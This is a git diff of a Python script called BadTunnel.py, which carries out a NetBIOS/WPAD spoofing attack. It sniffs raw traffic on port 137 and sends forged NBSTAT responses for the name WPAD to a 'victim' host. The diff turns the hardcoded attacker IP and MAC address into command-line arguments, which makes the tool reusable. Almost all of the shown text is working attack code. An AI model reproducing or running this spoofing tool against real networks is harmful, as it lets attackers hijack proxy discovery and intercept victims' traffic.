@@ -1,5 +1,6 @@
 # BadTunnel.py
 # -----------------------------------------
+# Receives as arguments [ip_address], [mac_address]
 
 # Imports
 import socket
@@ -19,8 +20,6 @@ IP_SRC_END              = 32
 
 # ---------------------------------
 # Constants
-ATTCKR_IP               = '172.16.0.54'
-ATTCKR_IP_HEX           = "ac100036"
 PORT                    = 137
 WPAD_20                 = "\x57\x50\x41\x44\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
 MAC_ADDR                = "\x78\xac\xc0\x95\x75\x26"
@@ -92,11 +91,11 @@ def main():
             
             # Start answering to packet.
             reply = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            reply.bind((ATTCKR_IP, PORT))
+            reply.bind((attacker_ip, PORT))
             reply.settimeout(2)
 
             # Building the NBSTAT response.
-            packet = NB_ANS(data, WPAD_20, MAC_ADDR)
+            packet = NB_ANS(data, WPAD_20, attacker_mac)
 
             # Sending the packet to the victim.
             reply.sendto(NB_ANS.packetize(packet), (ip_dec, PORT))
@@ -105,7 +104,7 @@ def main():
 
             # Starts sniffing again.
             sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
-            sniffer.bind((ATTCKR_IP, 0))
+            sniffer.bind((attacker_ip, 0))
             sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
 
